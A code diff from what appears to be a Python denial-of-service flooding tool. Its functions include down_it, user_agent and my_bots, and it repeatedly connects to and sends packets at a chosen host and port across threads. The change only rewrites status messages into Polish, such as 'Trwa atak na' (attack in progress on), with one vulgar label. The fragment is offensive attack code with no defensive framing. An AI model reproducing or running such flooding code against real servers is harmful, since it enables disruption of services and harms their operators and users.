@@ -49,7 +49,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[92m> Trwa atakowanie ",host,"\033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91m> Wyjebano metoda: TRUERIP\033[0m")
@@ -123,7 +123,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m> Trwa atak na ",host," port: ",str(port)," ",str(thr),"\033[0m")
-	print("\033[94m> Atakowanie",host," serwera metoda: TRUERIP1\033[0m")
+	print("\033[94m> Atakowanie",host,"metoda: TRUERIP1\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
